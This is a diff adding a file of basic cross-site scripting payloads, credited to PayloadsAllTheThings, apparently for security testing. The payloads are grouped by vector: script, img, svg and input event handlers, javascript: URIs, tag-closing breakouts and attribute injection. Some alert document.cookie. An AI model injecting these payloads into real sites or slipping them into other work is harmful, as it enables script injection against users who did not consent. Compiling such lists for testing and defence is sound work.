@@ -1,0 +1,89 @@
+# XSS Basic Payloads
+# 来源: PayloadsAllTheThings XSS Injection
+# 基础XSS payload集合
+
+# === Script标签 ===
+<script>alert('XSS')</script>
+<script>alert(1)</script>
+<script>alert(document.domain)</script>
+<script>alert(document.cookie)</script>
+<script>confirm('XSS')</script>
+<script>prompt('XSS')</script>
+<script>console.log('XSS')</script>
+<script>debugger;</script>
+
+# === IMG标签 ===
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=alert(document.domain)>
+<img src=x onerror=alert(document.cookie)>
+<img src="javascript:alert('XSS')">
+<img dynsrc="javascript:alert('XSS')">
+<img lowsrc="javascript:alert('XSS')">
+
+# === SVG标签 ===
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<svg onload=alert('XSS')>
+<svg onload=alert(document.domain)>
+<svg><script>alert(1)</script></svg>
+
+# === Body标签 ===
+<body onload=alert(1)>
+<body onload=alert('XSS')>
+<body onpageshow=alert(1)>
+<body onfocus=alert(1)>
+<body onhashchange=alert(1)>
+
+# === Input标签 ===
+<input onfocus=alert(1) autofocus>
+<input onblur=alert(1) autofocus><input autofocus>
+<input type="image" src=x onerror=alert(1)>
+<input type="text" onfocus=alert(1)>
+
+# === 其他标签 ===
+<div onmouseover=alert(1)>hover me</div>
+<a href="javascript:alert(1)">click me</a>
+<a onmouseover=alert(1)>hover me</a>
+<iframe src="javascript:alert(1)">
+<iframe onload=alert(1)>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<form action="javascript:alert(1)"><input type=submit>
+<button onclick=alert(1)>click me</button>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<keygen onfocus=alert(1) autofocus>
+
+# === 闭合标签 ===
+"></script><script>alert(1)</script>
+'></script><script>alert(1)</script>
+</title><script>alert(1)</script>
+</textarea><script>alert(1)</script>
+</style><script>alert(1)</script>
+</noscript><script>alert(1)</script>
+
+# === 属性注入 ===
+" onmouseover=alert(1) x="
+' onmouseover=alert(1) x='
+" onfocus=alert(1) autofocus x="
+' onfocus=alert(1) autofocus x='
+" onclick=alert(1) x="
+' onclick=alert(1) x='
+
+# === 事件处理器 ===
+onload=alert(1)
+onerror=alert(1)
+onclick=alert(1)
+onmouseover=alert(1)
+onfocus=alert(1)
+onblur=alert(1)
+onchange=alert(1)
+onsubmit=alert(1)
+onkeydown=alert(1)
+onkeyup=alert(1)
+onkeypress=alert(1)
